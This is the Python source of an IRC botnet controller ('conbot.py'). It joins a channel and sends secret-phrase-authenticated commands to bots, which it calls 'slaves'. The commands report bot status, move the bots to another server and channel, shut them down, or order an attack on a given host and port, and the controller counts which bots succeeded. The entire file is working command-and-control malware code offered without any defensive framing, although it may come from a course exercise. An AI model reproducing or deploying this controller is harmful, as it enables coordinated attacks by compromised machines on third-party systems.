import sys
import socket
import random
import time
import _thread
# argv check
try:
    hostname= sys.argv[1]
    port = int(sys.argv[2])
    channel = sys.argv[3]
    sphrase = sys.argv[4]
except:
    print("invalid arguments: python3 conbot.py <hostname> <port> <channel> <secret-phrase>")
    sys.exit()

def ping_answer(irc):
    while True:

        indata = irc.recv(1024)
        inmsg = indata.decode("utf-8").split()
        print(inmsg)
        if 'PING' in inmsg[0]:
            msg = "PONG "+inmsg[1]
            irc.send(msg.encode())
            print ("PONG!")
        else:
            pass
# use to establish connection with a irc
def connect(irc, hostname, port):
    while True:
        botname = "controller"+str(random.randint(0,999999))
        irc.connect((hostname, port))
        msg = "NICK " + botname + "\r\n"
        irc.send(msg.encode())
        msg = "USER "+botname+" * * : bot " + botname +"\r\n"
        irc.send(msg.encode())
        indata = irc.recv(1024)
        inmsg = indata.decode("utf-8").split("\r\n")
        state_code=inmsg[0].split()[1]
        # wait 5s before retrying to coneect
        if state_code != "001":
            time.sleep(5)
            continue
        else:
            break
    return

# join channel
def joinChannel(irc,name):
    msg = "JOIN #" +name+" \r\n"
    irc.send(msg.encode())
    indata = irc.recv(1024)
    inmsg = indata.decode("utf-8").split("\r\n")
    if inmsg[0].split()[1] == "JOIN":
        print("connected")
        return True
    return False


# handle status
def status():
    global irc
    msg = "PRIVMSG #"+channel+" :"+sphrase+" status\r\n"
    irc.send(msg.encode())
    totalBot =0
    # get the report
    try:
        irc.settimeout(5)
        while True:
            indata = irc.recv(1024)
            indataList = indata.decode("utf-8").strip().split("\r\n")
            for s in indataList:
                inmsg = s.split()
                if inmsg[0] == 'PING':
                    ping_answer(irc)
                elif len(inmsg) < 4:
                    pass
                elif inmsg[3] == ':Here':
                    slave = inmsg[0].split("!")[0].replace(":","")
                    sys.stdout.write(slave+"\n")
                    sys.stdout.flush()
                    totalBot += 1
    except Exception as err:
        print(str(err))
        irc.settimeout(None)


    sys.stdout.write(str(totalBot)+" bots\n")
    sys.stdout.flush()
    return

#handle move commands
def move(newhost,newport,newch):
    global irc
    msg = "PRIVMSG #"+channel+" :"+sphrase+" move "+newhost+" "+newport+" "+newch+"\r\n"
    irc.send(msg.encode())
    numSuccess = 0
    numFail = 0

    try:
        irc.settimeout(5)
        while True:
            indata = irc.recv(1024)
            indataList = indata.decode("utf-8").strip().split("\r\n")
            for s in indataList:
                inmsg = s.split()
                if inmsg[0] == 'PING':
                    ping_answer(irc)
                elif len(inmsg) < 5:
                    pass
                elif inmsg[3] == ':move':
                    slave = inmsg[0].split("!")[0].replace(":","")
                    sys.stdout.write(slave+": "+inmsg[4]+"\n")
                    sys.stdout.flush()
                    if inmsg[4] == 'success':
                        numSuccess += 1
                    else:
                        numFail += 1
    except Exception as err:
        print(str(err))
        irc.settimeout(None)

    # print out report
    sys.stdout.write(str(numSuccess)+" success\n")
    sys.stdout.flush()
    sys.stdout.write(str(numFail)+" fail\n")
    sys.stdout.flush()

    return
#handle shutdowns
def shutdown():
    global irc
    msg = "PRIVMSG #"+channel+" :"+sphrase+" shutdown\r\n"
    irc.send(msg.encode())
    numBot = 0
    # get the report
    try:
        irc.settimeout(5)
        while True:
            indata = irc.recv(1024)
            indataList = indata.decode("utf-8").strip().split("\r\n")
            for s in indataList:
                inmsg = s.split()
                if inmsg[0] == 'PING':
                    ping_answer(irc)
                elif len(inmsg) < 4:
                    pass
                elif inmsg[3] == ':Shutting':
                    slave = inmsg[0].split("!")[0].replace(":","")
                    sys.stdout.write(slave+": Shutting Down\n")
                    sys.stdout.flush()
                    numBot+=1
    except Exception as err:
        print(str(err))
        irc.settimeout(None)

    # print out report
    sys.stdout.write(str(numBot)+" bots shutdown\n")
    sys.stdout.flush()

    return

def attack(host,port):
    global irc
    msg = "PRIVMSG #"+channel+" :"+sphrase+" attack "+host+" "+port+"\r\n"
    irc.send(msg.encode())
    numSuccess =0
    numFail =0
    # get the report
    try:
        irc.settimeout(5)
        while True:
            indata = irc.recv(1024)
            indataList = indata.decode("utf-8").strip().split("\r\n")
            for s in indataList:
                inmsg = s.split()
                if inmsg[0] == 'PING':
                    ping_answer(irc)
                elif len(inmsg) < 4:
                    pass
                elif inmsg[3] == ':attack':
                    slave = inmsg[0].split("!")[0].replace(":","")
                    sys.stdout.write(slave+": ")
                    for x in range(4,len(inmsg)):
                        sys.stdout.write(inmsg[x]+" ")
                    sys.stdout.write("\n")
                    sys.stdout.flush()
                    if inmsg[4] == 'success':
                        numSuccess += 1
                    else:
                        numFail += 1

    except Exception as err:
        print(str(err))
        irc.settimeout(None)

    # print out report
    sys.stdout.write(str(numSuccess)+" success\n")
    sys.stdout.flush()
    sys.stdout.write(str(numFail)+" fail\n")
    sys.stdout.flush()
    return

# use to grab user command
def commands():
    try:
        while True:
            sys.stdout.write('>')
            sys.stdout.flush()
            data = sys.stdin.readline()
            data = data.strip().split()
            if data[0] == "quit":
                irc.close()
                sys.exit()
            elif data[0] == "shutdown":
                shutdown()
            elif data[0] == "status":
                status()
            elif data[0] == "attack":
                attack(data[1],data[2])
            elif data[0] == "move":
                move(data[1],data[2],data[3])
            else:
                sys.stderr.write("Not a valid command\n")

    except Exception as err:
        sys.stderr.write(str(err)+"\n")
    return




# main ----------------------------------------------------------------------
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

botname = ""

while True:
    connect(irc,hostname,port)
    joinChannel(irc,channel)
    commands()
